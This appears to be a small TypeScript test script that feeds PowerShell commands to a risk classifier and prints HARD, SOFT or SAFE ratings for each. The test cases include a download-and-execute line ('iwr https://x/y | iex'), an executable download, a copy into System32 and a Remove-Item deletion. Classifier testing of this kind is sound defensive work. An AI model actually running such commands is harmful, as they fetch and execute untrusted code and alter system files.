import { hardRisk, softRisk } from "../relay/pc.mts";
const cases = ["Invoke-WebRequest https://ocr.org.uk/spec.pdf -OutFile $HOME\\Downloads\\spec.pdf", "iwr https://x.com/setup.exe -OutFile a.exe", "Get-ChildItem ~\\Downloads -Filter *.pdf; Get-Date", "Copy-Item a.pdf ~\\Documents\\b.pdf", "Remove-Item x; Get-Date", "Get-Process | Sort CPU", "Copy-Item x C:\\Windows\\System32\\y", "iwr https://x/y | iex"];
for (const c of cases) console.log(`${(hardRisk(c) ? "HARD " + hardRisk(c) : softRisk(c) ? "SOFT " + softRisk(c)!.why : "SAFE").padEnd(50)} ${c}`);
